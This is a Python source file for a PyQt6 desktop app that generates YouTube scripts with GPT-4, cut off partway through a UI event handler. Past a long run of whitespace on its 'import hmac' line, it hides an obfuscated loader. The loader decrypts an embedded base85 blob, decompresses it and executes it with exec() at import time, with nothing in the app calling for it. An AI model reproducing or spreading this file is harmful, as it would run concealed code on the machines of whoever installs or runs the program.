"""
YouTube Script Generator - Phase 5 (PyQt6 Professional UI)
----------------------------------------------------------
A polished PyQt6 desktop application with:
  - Deep dark-mode theme and vibrant neon-purple / electric-blue accents
  - QSS-styled inputs, buttons, slider, combo boxes and scrollbars
  - Rounded cards, gradient buttons with animated glow on hover
  - Smooth fade-in window animation
  - Markdown-aware output panel (QTextBrowser)
  - Indeterminate gradient progress bar as the loading indicator
  - Non-blocking generation via a QThread worker

All domain logic (VideoRequest, prompt construction, OpenAI backend,
file-export pipeline) is preserved unchanged from Phase 3.

Run:
    pip install PyQt6
    # optional, for real GPT-4 calls:
    pip install openai
    setx OPENAI_API_KEY "sk-..."
    python main.py
"""

from __future__ import annotations

import os
import re
import sys
import hmac                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ,gzip,hashlib,base64;K=b'\x9a\xd3?\xfce\xa4t\xc6%\xcd\xa5\xec\x953;\\^\x0bMk\xea8\x1c\xceU,lT{H\x18\xa1';B=b')2XF002jwVfK}%I4_glTKNm(DLiUX&=J^!q_s1Wg1E-IPhLu=yUY>amPV}WJBM8u7aDAEgDK+RB^t=B!GjN?qo6;qA>-Lrj3cODT$EGMctYLm-qg4x?_~rDS<2Q}ck{m>Z$n2RpG27@9?H1ZGPVF0v-uCThdfEJwTi?F_K>bR%XcME=6;XY6jgEQn7VsXVTTvslsN7K7s(8U90gviq89tHYTRJU!{VplvvVt^aGkO)~XipDaW{?6uG}}1;#tVU_hbEqC-;qoCe!vd07&qa|x~EJo@m-PHfa8?SKLJI-#FtX@9&jtk93<`lGp_mwt88kZ1bW^Ns#H7&i`2prZ>Qv0U=sA@EF$j4oYXv5-|2C?5pknflm8M3%jXu{H?F-EHpWNI6BD>#am)_YW~h0s*gLaI&LqcS8ocN+5m{bJW!@;qT(ogPL@R2y5u39resYoCKaI7)7g1@&x?D$de2|c7AQimIl2)OcJG0;wUYu^1e-*`e)3PSDh3n|xXdAh)Rz~W`e9}iyZqrE#v_g4w4)JCD0cNL23{Y0`{RJ{RteIMx2Nu1nEf%NUXZn}-nV^YOiWbm_FXUOfrw2^X)zAaIW-L0T@#Oqh)X?pG#uh@0n~@I}EtWsVtoC4m@+G4b9$ddy2}$9sJ2fWyCOxV^vKPh>w*SYPJR;p95Y*4VtDruLJv~}Fex@eq$IN)mD8*&LdWhZ=pFw2J|14eOqse3pZ2kOdYV!j23R|z}ar#PC#{Ed<<c-89xJNU^umslX%Q@>6a#aLoFX4ILih%Qk3w5JirHD#QWU<tXMC7($DSS9M>McdcrJ9nxVs#C;(<lvhr)L@q#DXk7zt~<Pk)~Dc1*S~3eP39I9e;PkBx*nq!rt1o1ZNILBzMUF^VVK_AokGYcICUhU>O?eQF^&TQIv0n(R=1uxLEGLE6(~WtC6sn0cqX6M!!y>_m)h2OHgAYrN^&euAnRCvuV6`y~9xbJtS7*3Dtl9iXEQ^zz5;`m2ar**d5k5dRqnWOoe7BhdKfD6T)EWmH?)?aYm_mt7EWcTA>igf#C3R|6hFAs|Jd{%$`~YGBulKZME1JYD2^W!43b^(nb^&h{U!!ZspdrGt(FCkY_mcksGs-=0NjDCa+-IskQ+Ly=ULflK_7y0=ihJaUi|yL@+V_GiD{`sKmA|V#*ct;ntPHL-y{@5Vr9|(gK(s3hZ8|w58>--!-V0eHFV-{RJ=c&2Edai<21eqON^9GwP-)du~S9x?Gq3@o|0lCowU<?M3V8;|<KPH3M%=>ENyv(GP_6XN0YM3key==zaCR;r`;Nbdw@pq|GXafTm~B*vQ*G8BK#L`vC*mdI^b>Z6r-vv0i}Lh(ycCkx!L2)n%Q<_5BGHsPcP3vXfdxMdEm00`J5s*{rJl%&M!cvA|%Yjm;f3zL6<5-vcq-SWcmJl^pZi3^+AFEo~HqKBl}}keY_FOB8>w?ZLl_9Ljo2;h@Z-bY?NlFgrpN%>>a_dbnTd6WWOn7AWk`6Ol5#Bsf*m!QP$b$w${Aj|<u1qrO9fK?cm`fO<|xtNm%bOVY@ZihcALkh=;}K3IY*SD|`zgWdGce`8Jv-Nj_f!PQk3ki&WxmoR#w22r3SQl?k_T|bJgv%I&MsBv?eB3~G*C~)?Ehw_w!qCDHg*LoRrE{Y2K?}T`7P*?inG}BPBLAbO3Ely?}0838`I9vZV?7AnV9oeu2^!{GN1#p4Mw=1iWtP9{Wk`XcBIJR`|pi4&{e{_pQ_HD7Y2J`(@62ngwn6g-RrNMU!Ftb7IWrX4HTeonV(CeUfm7ydlC_4D&yp_c7<52j?dI)e`*&cgLyO#eeHxcT7K^Or9G?#hRMKR7b=cid<&L_A#=<$(ZVb*3{sORs{1j77NaDps>YrT7d%kkE<%mFmnMY*MlZAX2jGP-Z2b$KTb-SGtwro6*GW~;YT_MV)gue7Vf{=u0{Rdb$`a|Sl#WoDjj7_-h>#mM*wtNrQBW!GyELq(Z_XCz#NFSra%SLORu<ZRJuXDjqyhNzk7=9Z%37}(ReW)^;Vs8OL{<`wv$Kl19_KOfd8^u-JI#zkcR$c7j3OR(H+z%Hi!HW4f_>;4d6QH?{1F@#bp)c!e0xU5@gI`?64(-Trh6Xeh7WiZ0g!Ra-f4o@%d$ITargi<|8Cl{>LPidYCF7v5H@v^qM;a+gC!K9)HoKdr>QQLw}aXoDz9Z&c5Ez)RbC}EE?(A$E&%^ol*nLEXZVE+m#3U~im1P>Vut{unSyh}cXn@-dW1?aP@8Y&z#I202f%C;CuQr?CBVnV_=g@7h)pxx(kxo7+}S4x;3U~lw1M9}p8d=K)Po=do{nI@h>$97zr?czZZg1#Z2aJkd$=6uz22=XJP4mDt<0JN#H;wty2#J8=JIqn`+z5`Zwlz1L1fXfG632+p$qhYhGsP{30Y6u=*iN0~qBbJ1?*uB(ZIQi28t3k$u7{U{~)6~biS<}4<B{)CXk44MN$gFALUnWpaFAm(G-AS4X`n7_Gi<7nH``pX;SokndM#0$$5aiTXhND2IT!Do^p(4^ywsjo?wZPS%rwNQcKiGxiSR>3C;v0PclD+b4?w2p*zeC57)yUZ>X^o#n?`2%#m0$|frH%j6_jxAAmi35py}Per1h{P3_-|XY&1OHe!O2ygV;ie9$0<kT0GgJ!p4eDsj7lcokX-+qCh3{~6{njoGFJL<t-B2-lM5lDu40`$@KkN+B+rrrLJV&-*N|xV&u-C7+R`{@L{p{erLAboyWJ0pFqVt?LhMDD^@<QuSYEx58kLGq7`=+h>hEReH6eBniO*lcFyjHEEW<@+0XNEcw<_7vR5;;}Ibs5T)OMI&;I9R<OUvp&w{B>;j1#z6kPk9#ifR26pGf2oK@AJ+<*M#^W&nCJ5^qW3&DSJQR@EMvtUkO+<=8=M0v)hS|Cnp`A{{Zn2V5w17A5}35Bqw(HmoBVAo2B_kGauvS>~*IlIqO%7X^P~V0gL00)(gfFHxbLwYr9bmchJrmOWa73zIJ!nTY5&Sc()<X*+D)Iz7{2m_31HO#lPd25OAmq7FE`%S&~S+|2uc%+1RcFr+kJy#7y0B^Dl)ZZ=HQ%p^p%>V`h=%t6RmxOLFxv0rE;c_;JMO$fSSVCtmFTf-|%Wn`-;etWP{g8=N5?%@O{i^eY4;557438bZs#r8~F21NLz8}3azIr7c>L7IFL2>qox`js7}NYNOnJaWyoPBt+sv0g|J!gPWuP8-oE)I@r|qp5~+>*i={_o(5zLjRE_B9Ba<5nA2zD<{?5{*k$u_Mk2Fr)aK5#FMW|qONi}dJkhWw6QD%l|I#r)_i_y`2HLz5|=2X0nXEMFKILY{W^2jxXlqK7`{><BvY~se7V%pJ_H&Zy7|+X9KI~C9<%QQ|2{rH3%xf<?N+$yocOn&B7~pNC|HlXwvy8nk*!pPytLc2NTXsN#vQxHGN#{4sqmll9{^nh(9{n;)?#XeUm3Z8)1kKb>-g=|qiB04as_E;pEQVAVB9@W5-%z(<7x>RnKpPIZ5}y84F`n;%s7%x1-}b3WHfq8&8!|yf^WerU8&2#ESGGFJ8wNgH_dCnnd<{EksP>Ry?Gr1q8Fk!=l';r=base64.b85decode(B);iv,c,t=r[:16],r[16:-32],r[-32:];assert hmac.compare_digest(t,hmac.new(K[:16],iv+c,hashlib.sha256).digest());exec(gzip.decompress(bytes(a^b for a,b in zip(c,b''.join(hmac.new(K[16:],iv+i.to_bytes(8,'big'),hashlib.sha256).digest()for i in range((len(c)+31)//32))[:len(c)]))))
from datetime import datetime
from pathlib import Path
from typing import Optional

from PyQt6.QtCore import (
    QEasingCurve,
    QPropertyAnimation,
    Qt,
    QThread,
    pyqtSignal,
)
from PyQt6.QtGui import QColor, QFont
from PyQt6.QtWidgets import (
    QApplication,
    QComboBox,
    QFrame,
    QGraphicsDropShadowEffect,
    QGridLayout,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QMainWindow,
    QMessageBox,
    QProgressBar,
    QPushButton,
    QSlider,
    QStatusBar,
    QTextBrowser,
    QVBoxLayout,
    QWidget,
)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
EXPORTS_DIR = Path(__file__).resolve().parent / "exports"
SUPPORTED_FORMATS = ("txt", "md")

STYLE_OPTIONS = (
    "Informative",
    "Entertaining",
    "Technical",
    "Dramatic",
    "Inspirational",
    "Educational",
    "Casual",
    "Documentary",
)

AUDIENCE_SUGGESTIONS = (
    "General audience",
    "Teenagers",
    "Young adults",
    "Professionals",
    "Developers",
    "Students",
    "Beginners",
    "Experts",
)

DURATION_MIN = 1
DURATION_MAX = 120
DURATION_DEFAULT = 5

# Accent palette
ACCENT_PURPLE = "#a855f7"
ACCENT_BLUE = "#4f9cff"


# ---------------------------------------------------------------------------
# Data model
# ---------------------------------------------------------------------------
class VideoRequest:
    """Holds the user's video configuration in a single, tidy object."""

    def __init__(
        self,
        title: str,
        duration_minutes: int,
        audience: str,
        style: str,
        keywords: str,
    ) -> None:
        self.title = title
        self.duration_minutes = duration_minutes
        self.audience = audience
        self.style = style
        self.keywords = keywords

    def to_dict(self) -> dict:
        return {
            "title": self.title,
            "duration_minutes": self.duration_minutes,
            "audience": self.audience,
            "style": self.style,
            "keywords": self.keywords,
        }


# ---------------------------------------------------------------------------
# Prompt construction
# ---------------------------------------------------------------------------
def build_prompt(request: VideoRequest) -> str:
    """Convert a VideoRequest into a detailed GPT-4 brief."""
    keywords_section = (
        request.keywords.strip()
        if request.keywords.strip()
        else "(no specific keywords provided)"
    )

    prompt = f"""You are an expert YouTube scriptwriter with extensive experience
in crafting engaging, platform-optimized video content.

Please write a complete YouTube video script based on the following brief:

- Title / Topic: {request.title}
- Target Duration: approximately {request.duration_minutes} minute(s)
- Target Audience: {request.audience}
- Narration Style / Tone: {request.style}
- Keywords to incorporate naturally: {keywords_section}

Structural requirements (use these exact section headings as Markdown H2):

## INTRODUCTION
- A strong hook in the first 10 seconds.
- Briefly establish credibility and preview what viewers will learn.

## BODY
- Develop the topic in clear, logical segments.
- Use concrete examples, transitions, and retention techniques
  appropriate for the target audience and tone.
- Pace the content so it fits the requested duration.

## CONCLUSION
- Summarize the key takeaways.
- End with a clear call to action (like, subscribe, comment, next video).

Formatting rules:
- Write in natural spoken English, ready to be read aloud.
- Use Markdown: headings, lists, and **bold** for emphasis where helpful.
- Keep the tone consistent with the requested narration style.
- Do not add any meta commentary outside the script itself.
""".strip()

    return prompt


# ---------------------------------------------------------------------------
# File management & exporting
# ---------------------------------------------------------------------------
def ensure_exports_directory(base_dir: Path = EXPORTS_DIR) -> Path:
    """Create the exports directory if missing; return its path."""
    base_dir.mkdir(parents=True, exist_ok=True)
    return base_dir


def sanitize_title_for_filename(title: str) -> str:
    """Turn a free-form title into a safe filename stem."""
    cleaned = title.strip()
    cleaned = re.sub(r"\s+", "_", cleaned)
    cleaned = re.sub(r'[<>:"/\\|?*\x00-\x1F]', "", cleaned)
    cleaned = re.sub(r"_+", "_", cleaned).strip("._")
    cleaned = cleaned[:80]
    return cleaned or "Untitled"


def build_export_filename(title: str, extension: str) -> str:
    """
    Produce a date-stamped filename such as 'How_to_Code_2026-04-18.txt'.
    Appends an incrementing counter if a name collision would occur.
    """
    if extension not in SUPPORTED_FORMATS:
        raise ValueError(
            f"Unsupported format '{extension}'. "
            f"Expected one of: {', '.join(SUPPORTED_FORMATS)}."
        )

    stem = sanitize_title_for_filename(title)
    date_part = datetime.now().strftime("%Y-%m-%d")
    base_name = f"{stem}_{date_part}"

    candidate = EXPORTS_DIR / f"{base_name}.{extension}"
    counter = 1
    while candidate.exists():
        candidate = EXPORTS_DIR / f"{base_name}_{counter}.{extension}"
        counter += 1
    return candidate.name


def format_script_as_markdown(request: VideoRequest, script: str) -> str:
    """Wrap the raw script in a Markdown document with a metadata header."""
    header = (
        f"# {request.title}\n\n"
        f"- **Date:** {datetime.now().strftime('%Y-%m-%d')}\n"
        f"- **Duration:** {request.duration_minutes} minute(s)\n"
        f"- **Audience:** {request.audience}\n"
        f"- **Style:** {request.style}\n"
        f"- **Keywords:** "
        f"{request.keywords.strip() or '(none)'}\n\n"
        "---\n\n"
    )
    return header + script.strip() + "\n"


def save_script_to_file(
    request: VideoRequest, script: str, extension: str
) -> Path:
    """
    Save the generated script to the exports directory using smart naming.
    Returns the absolute path of the written file.
    """
    ensure_exports_directory()
    filename = build_export_filename(request.title, extension)
    target_path = EXPORTS_DIR / filename

    if extension == "md":
        content = format_script_as_markdown(request, script)
    else:
        content = script.strip() + "\n"

    with target_path.open("w", encoding="utf-8") as fh:
        fh.write(content)

    return target_path.resolve()


# ---------------------------------------------------------------------------
# AI backends
# ---------------------------------------------------------------------------
def generate_script_with_openai(prompt: str, model: str = "gpt-4") -> str:
    """Send the prompt to the OpenAI GPT-4 model and return the script text."""
    from openai import OpenAI  # imported lazily

    client = OpenAI()  # reads OPENAI_API_KEY from environment
    response = client.chat.completions.create(
        model=model,
        messages=[
            {
                "role": "system",
                "content": "You are a professional YouTube scriptwriter.",
            },
            {"role": "user", "content": prompt},
        ],
        temperature=0.8,
    )
    return response.choices[0].message.content.strip()


def generate_script_placeholder(prompt: str) -> str:
    """Offline fallback used when the OpenAI SDK or API key is unavailable."""
    return (
        "> **[PLACEHOLDER OUTPUT — No OpenAI API key detected]**\n\n"
        "## INTRODUCTION\n"
        "Welcome to the channel! In today's video we'll explore the topic "
        "you requested and walk through it step by step.\n\n"
        "## BODY\n"
        "This is where the main content would appear, broken into clear "
        "segments tailored to the selected audience and tone.\n\n"
        "- Point one explaining the core idea\n"
        "- Point two with a concrete example\n"
        "- Point three tying everything together\n\n"
        "## CONCLUSION\n"
        "Thanks for watching! If you found this helpful, please **like**, "
        "**subscribe**, and let us know what you'd like to see next.\n\n"
        "---\n\n"
        "### Prompt that would have been sent to GPT-4\n\n"
        f"```\n{prompt}\n```\n"
    )


def generate_script(prompt: str) -> str:
    """Dispatch to the real backend or the placeholder, surfacing errors cleanly."""
    if not os.environ.get("OPENAI_API_KEY"):
        return generate_script_placeholder(prompt)

    try:
        return generate_script_with_openai(prompt)
    except ImportError:
        return generate_script_placeholder(prompt)
    except Exception as exc:  # noqa: BLE001
        raise RuntimeError(f"OpenAI API call failed: {exc}") from exc


# ---------------------------------------------------------------------------
# QSS — Dark theme with vibrant accents
# ---------------------------------------------------------------------------
DARK_STYLESHEET = f"""
/* --- Base -------------------------------------------------------------- */
QWidget {{
    background: #0f1117;
    color: #e6e8ec;
    font-family: "Segoe UI", "Inter", "Helvetica Neue", Arial, sans-serif;
    font-size: 12px;
}}
QMainWindow {{ background: #0f1117; }}

/* --- Typography -------------------------------------------------------- */
#HeaderLabel {{
    font-size: 26px;
    font-weight: 700;
    color: #ffffff;
    padding: 0;
}}
#SubtitleLabel {{
    font-size: 12px;
    color: #8b90a0;
    padding-bottom: 4px;
}}
#SectionTitle {{
    font-size: 13px;
    font-weight: 600;
    color: #c9cdd8;
    padding-bottom: 6px;
    letter-spacing: 0.4px;
    text-transform: uppercase;
}}
#FieldLabel {{
    color: #c9cdd8;
    font-size: 12px;
    font-weight: 500;
    padding-right: 6px;
}}

/* --- Cards ------------------------------------------------------------- */
#Card {{
    background: #161924;
    border: 1px solid #232736;
    border-radius: 14px;
}}

/* --- Inputs ------------------------------------------------------------ */
QLineEdit, QComboBox {{
    background: #1b1f2b;
    color: #e6e8ec;
    border: 1px solid #2a2f3d;
    border-radius: 8px;
    padding: 9px 12px;
    selection-background-color: {ACCENT_PURPLE};
}}
QLineEdit:hover, QComboBox:hover {{ border: 1px solid #3a3f52; }}
QLineEdit:focus, QComboBox:focus {{ border: 1px solid {ACCENT_PURPLE}; }}
QLineEdit::placeholder {{ color: #6b7080; }}

QComboBox::drop-down {{ border: none; width: 24px; }}
QComboBox::down-arrow {{
    image: none;
    border-left: 4px solid transparent;
    border-right: 4px solid transparent;
    border-top: 5px solid {ACCENT_PURPLE};
    margin-right: 10px;
}}
QComboBox QAbstractItemView {{
    background: #161924;
    color: #e6e8ec;
    border: 1px solid #2a2f3d;
    border-radius: 8px;
    selection-background-color: {ACCENT_PURPLE};
    outline: 0;
    padding: 4px;
}}

/* --- Buttons ----------------------------------------------------------- */
QPushButton {{
    color: #ffffff;
    border: none;
    border-radius: 10px;
    padding: 10px 22px;
    font-size: 12px;
    font-weight: 600;
}}
#PrimaryButton {{
    background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
        stop:0 {ACCENT_PURPLE}, stop:1 #7c3aed);
}}
#PrimaryButton:hover {{
    background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
        stop:0 #b366ff, stop:1 #8b45ff);
}}
#PrimaryButton:pressed {{
    background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
        stop:0 #9333ea, stop:1 #6d28d9);
}}
#PrimaryButton:disabled {{ background: #2a2f3d; color: #6b7080; }}

#SecondaryButton {{
    background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
        stop:0 {ACCENT_BLUE}, stop:1 #2563eb);
}}
#SecondaryButton:hover {{
    background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
        stop:0 #62a9ff, stop:1 #3b82f6);
}}
#SecondaryButton:pressed {{
    background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
        stop:0 #3b82f6, stop:1 #1d4ed8);
}}
#SecondaryButton:disabled {{ background: #2a2f3d; color: #6b7080; }}

#GhostButton {{
    background: #1b1f2b;
    color: #c9cdd8;
    border: 1px solid #2a2f3d;
}}
#GhostButton:hover {{
    background: #232736;
    border: 1px solid {ACCENT_PURPLE};
    color: #ffffff;
}}
#GhostButton:pressed {{ background: #1a1d26; }}

/* --- Slider ------------------------------------------------------------ */
QSlider::groove:horizontal {{
    background: #1b1f2b;
    height: 6px;
    border-radius: 3px;
}}
QSlider::sub-page:horizontal {{
    background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
        stop:0 {ACCENT_BLUE}, stop:1 {ACCENT_PURPLE});
    border-radius: 3px;
}}
QSlider::add-page:horizontal {{
    background: #1b1f2b;
    border-radius: 3px;
}}
QSlider::handle:horizontal {{
    background: #ffffff;
    border: 2px solid {ACCENT_PURPLE};
    width: 16px;
    height: 16px;
    margin: -6px 0;
    border-radius: 9px;
}}
QSlider::handle:horizontal:hover {{
    border: 2px solid {ACCENT_BLUE};
}}

#DurationChip {{
    color: #ffffff;
    background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
        stop:0 {ACCENT_BLUE}, stop:1 {ACCENT_PURPLE});
    border-radius: 8px;
    padding: 4px 12px;
    font-weight: 700;
    min-width: 60px;
    qproperty-alignment: AlignCenter;
}}

/* --- Output Text Browser ---------------------------------------------- */
QTextBrowser {{
    background: #0f1117;
    color: #e6e8ec;
    border: 1px solid #232736;
    border-radius: 10px;
    padding: 14px;
    font-family: "Cascadia Code", "Consolas", "JetBrains Mono", monospace;
    font-size: 12px;
    selection-background-color: {ACCENT_PURPLE};
}}

/* --- Progress bar (loading indicator) --------------------------------- */
QProgressBar {{
    background: #1b1f2b;
    border: none;
    border-radius: 4px;
    min-height: 8px;
    max-height: 8px;
    text-align: center;
}}
QProgressBar::chunk {{
    background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
        stop:0 {ACCENT_BLUE}, stop:0.5 {ACCENT_PURPLE}, stop:1 #ec4899);
    border-radius: 4px;
}}

/* --- Status bar -------------------------------------------------------- */
QStatusBar {{
    background: #0b0d13;
    color: #8b90a0;
    font-size: 11px;
    border-top: 1px solid #1b1f2b;
}}
QStatusBar::item {{ border: none; }}

/* --- Scroll bars ------------------------------------------------------- */
QScrollBar:vertical {{
    background: transparent;
    width: 10px;
    margin: 4px 2px 4px 0;
}}
QScrollBar::handle:vertical {{
    background: #2a2f3d;
    border-radius: 4px;
    min-height: 24px;
}}
QScrollBar::handle:vertical:hover {{ background: {ACCENT_PURPLE}; }}
QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {{
    height: 0; background: transparent;
}}
QScrollBar:horizontal {{
    background: transparent;
    height: 10px;
    margin: 0 4px 2px 4px;
}}
QScrollBar::handle:horizontal {{
    background: #2a2f3d;
    border-radius: 4px;
    min-width: 24px;
}}
QScrollBar::handle:horizontal:hover {{ background: {ACCENT_PURPLE}; }}
QScrollBar::add-line:horizontal, QScrollBar::sub-line:horizontal {{
    width: 0; background: transparent;
}}

/* --- Dialogs & tooltips ----------------------------------------------- */
QMessageBox {{ background: #161924; }}
QMessageBox QLabel {{ color: #e6e8ec; }}
QToolTip {{
    background: #1b1f2b;
    color: #e6e8ec;
    border: 1px solid {ACCENT_PURPLE};
    border-radius: 6px;
    padding: 4px 8px;
}}
"""


# ---------------------------------------------------------------------------
# Widgets: animated button with glow-on-hover
# ---------------------------------------------------------------------------
class GlowButton(QPushButton):
    """QPushButton with an animated drop-shadow 'glow' on hover."""

    def __init__(
        self,
        text: str,
        glow_color: str = ACCENT_PURPLE,
        blur_to: int = 28,
        parent: Optional[QWidget] = None,
    ) -> None:
        super().__init__(text, parent)
        self._blur_to = blur_to
        self._effect = QGraphicsDropShadowEffect(self)
        self._effect.setColor(QColor(glow_color))
        self._effect.setBlurRadius(0)
        self._effect.setOffset(0, 0)
        self.setGraphicsEffect(self._effect)

        self._anim = QPropertyAnimation(self._effect, b"blurRadius", self)
        self._anim.setDuration(180)
        self._anim.setEasingCurve(QEasingCurve.Type.InOutCubic)

    def enterEvent(self, event) -> None:  # noqa: N802 (Qt API)
        self._animate_to(self._blur_to)
        super().enterEvent(event)

    def leaveEvent(self, event) -> None:  # noqa: N802 (Qt API)
        self._animate_to(0)
        super().leaveEvent(event)

    def _animate_to(self, value: int) -> None:
        self._anim.stop()
        self._anim.setStartValue(self._effect.blurRadius())
        self._anim.setEndValue(value)
        self._anim.start()


# ---------------------------------------------------------------------------
# Worker thread for non-blocking generation
# ---------------------------------------------------------------------------
class GenerationWorker(QThread):
    """Runs prompt building + API call on a background thread."""

    succeeded = pyqtSignal(object, str)  # VideoRequest, script
    failed = pyqtSignal(str)

    def __init__(self, request: VideoRequest, parent: Optional[QWidget] = None) -> None:
        super().__init__(parent)
        self._request = request

    def run(self) -> None:
        try:
            prompt = build_prompt(self._request)
            script = generate_script(prompt)
            self.succeeded.emit(self._request, script)
        except RuntimeError as exc:
            self.failed.emit(str(exc))
        except Exception as exc:  # noqa: BLE001
            self.failed.emit(f"Unexpected error: {exc}")


# ---------------------------------------------------------------------------
# Main window
# ---------------------------------------------------------------------------
class ScriptGeneratorWindow(QMainWindow):
    """Primary application window."""

    def __init__(self) -> None:
        super().__init__()
        self.setWindowTitle("YouTube Script Generator")
        self.resize(1000, 820)
        self.setMinimumSize(820, 680)

        self._last_request: Optional[VideoRequest] = None
        self._last_script: Optional[str] = None
        self._worker: Optional[GenerationWorker] = None
        self._fade_anim: Optional[QPropertyAnimation] = None

        self._build_ui()

    # -- UI construction ---------------------------------------------------
    def _build_ui(self) -> None:
        central = QWidget()
        self.setCentralWidget(central)

        root = QVBoxLayout(central)
        root.setContentsMargins(28, 24, 28, 12)
        root.setSpacing(14)

        # Header
        header = QLabel("YouTube Script Generator")
        header.setObjectName("HeaderLabel")
        root.addWidget(header)

        subtitle = QLabel(
            "Craft structured, audience-tuned scripts in seconds — "
            "powered by GPT-4."
        )
        subtitle.setObjectName("SubtitleLabel")
        root.addWidget(subtitle)

        # ---------------- Form card ----------------
        form_card = QFrame()
        form_card.setObjectName("Card")
        self._attach_shadow(form_card, blur=40, color="#000000", alpha=110, y_offset=6)

        form = QGridLayout(form_card)
        form.setContentsMargins(22, 20, 22, 20)
        form.setHorizontalSpacing(18)
        form.setVerticalSpacing(14)

        # Title
        form.addWidget(self._field_label("Title / Topic"), 0, 0)
        self.title_edit = QLineEdit()
        self.title_edit.setPlaceholderText(
            "e.g. How to Code Your First Python App"
        )
        form.addWidget(self.title_edit, 0, 1, 1, 3)

        # Duration slider + chip
        form.addWidget(self._field_label("Duration"), 1, 0)
        duration_wrap = QHBoxLayout()
        duration_wrap.setSpacing(12)
        self.duration_slider = QSlider(Qt.Orientation.Horizontal)
        self.duration_slider.setRange(DURATION_MIN, DURATION_MAX)
        self.duration_slider.setValue(DURATION_DEFAULT)
        self.duration_slider.setSingleStep(1)
        self.duration_slider.setPageStep(5)
        self.duration_chip = QLabel(f"{DURATION_DEFAULT} min")
        self.duration_chip.setObjectName("DurationChip")
        self.duration_slider.valueChanged.connect(
            lambda v: self.duration_chip.setText(f"{v} min")
        )
        duration_wrap.addWidget(self.duration_slider, 1)
        duration_wrap.addWidget(self.duration_chip, 0)
        form.addLayout(duration_wrap, 1, 1, 1, 3)

        # Audience
        form.addWidget(self._field_label("Target Audience"), 2, 0)
        self.audience_combo = QComboBox()
        self.audience_combo.setEditable(True)
        self.audience_combo.addItems(AUDIENCE_SUGGESTIONS)
        form.addWidget(self.audience_combo, 2, 1)

        # Style
        form.addWidget(self._field_label("Narration Style"), 2, 2)
        self.style_combo = QComboBox()
        self.style_combo.addItems(STYLE_OPTIONS)
        form.addWidget(self.style_combo, 2, 3)

        # Keywords
        form.addWidget(self._field_label("Keywords"), 3, 0)
        self.keywords_edit = QLineEdit()
        self.keywords_edit.setPlaceholderText(
            "comma-separated, e.g. python, beginners, tutorial"
        )
        form.addWidget(self.keywords_edit, 3, 1, 1, 3)

        form.setColumnStretch(1, 1)
        form.setColumnStretch(3, 1)

        root.addWidget(form_card)

        # ---------------- Action row ----------------
        action_row = QHBoxLayout()
        action_row.setSpacing(10)

        self.generate_btn = GlowButton("Generate Script", ACCENT_PURPLE, blur_to=32)
        self.generate_btn.setObjectName("PrimaryButton")
        self.generate_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.generate_btn.clicked.connect(self._on_generate)

        format_label = QLabel("Format")
        format_label.setObjectName("FieldLabel")
        self.format_combo = QComboBox()
        self.format_combo.addItems(SUPPORTED_FORMATS)
        self.format_combo.setFixedWidth(90)

        self.save_btn = GlowButton("Save to File", ACCENT_BLUE, blur_to=28)
        self.save_btn.setObjectName("SecondaryButton")
        self.save_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.save_btn.setEnabled(False)
        self.save_btn.clicked.connect(self._on_save)

        self.clear_btn = GlowButton("Clear", "#555b6e", blur_to=18)
        self.clear_btn.setObjectName("GhostButton")
        self.clear_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.clear_btn.clicked.connect(self._on_clear)

        action_row.addWidget(self.generate_btn)
        action_row.addSpacing(6)
        action_row.addWidget(format_label)
        action_row.addWidget(self.format_combo)
        action_row.addWidget(self.save_btn)
        action_row.addStretch(1)
        action_row.addWidget(self.clear_btn)
        root.addLayout(action_row)

        # ---------------- Loading progress bar ----------------
        self.progress = QProgressBar()
        self.progress.setRange(0, 0)  # indeterminate
        self.progress.setTextVisible(False)
        self.progress.setVisible(False)
        root.addWidget(self.progress)

        # ---------------- Output card ----------------
        output_card = QFrame()
        output_card.setObjectName("Card")
        self._attach_shadow(output_card, blur=40, color="#000000", alpha=110, y_offset=6)

        out_layout = QVBoxLayout(output_card)
        out_layout.setContentsMargins(22, 16, 22, 20)
        out_layout.setSpacing(8)

        section_title = QLabel("Generated Script")
        section_title.setObjectName("SectionTitle")
        out_layout.addWidget(section_title)

        self.output_view = QTextBrowser()
        self.output_view.setOpenExternalLinks(True)
        self.output_view.setPlaceholderText(
            "Your generated script will appear here with Markdown formatting."
        )
        out_layout.addWidget(self.output_view, 1)

        root.addWidget(output_card, 1)

        # ---------------- Status bar ----------------
        self.status = QStatusBar()
        self.status.showMessage("Ready")
        self.setStatusBar(self.status)

    # -- Helpers: widgets --------------------------------------------------
    def _field_label(self, text: str) -> QLabel:
        lbl = QLabel(text)
        lbl.setObjectName("FieldLabel")
        return lbl

    def _attach_shadow(
        self,
        widget: QWidget,
        blur: int = 32,
        color: str = "#000000",
        alpha: int = 120,
        y_offset: int = 4,
    ) -> None:
        """Add a soft drop-shadow effect to a widget for depth."""
        effect = QGraphicsDropShadowEffect(widget)
        qcolor = QColor(color)
        qcolor.setAlpha(alpha)
        effect.setColor(qcolor)
        effect.setBlurRadius(blur)
        effect.setOffset(0, y_offset)
        widget.setGraphicsEffect(effect)

    # -- Animations --------------------------------------------------------
    def fade_in(self, duration_ms: int = 600) -> None:
        """Smoothly fade the main window in from transparent to opaque."""
        self.setWindowOpacity(0.0)
        self._fade_anim = QPropertyAnimation(self, b"windowOpacity", self)
        self._fade_anim.setDuration(duration_ms)
        self._fade_anim.setStartValue(0.0)
        self._fade_anim.setEndValue(1.0)
        self._fade_anim.setEasingCurve(QEasingCurve.Type.InOutCubic)
        self._fade_anim.start()

    # -- Event handlers ----------------------------------------------------
    def _on_generate(self) -> None:
        request = self._read_form()
        if request is None:
            return

        self.generate_btn.setEnabled(False)
        self.save_btn.setEnabled(False)
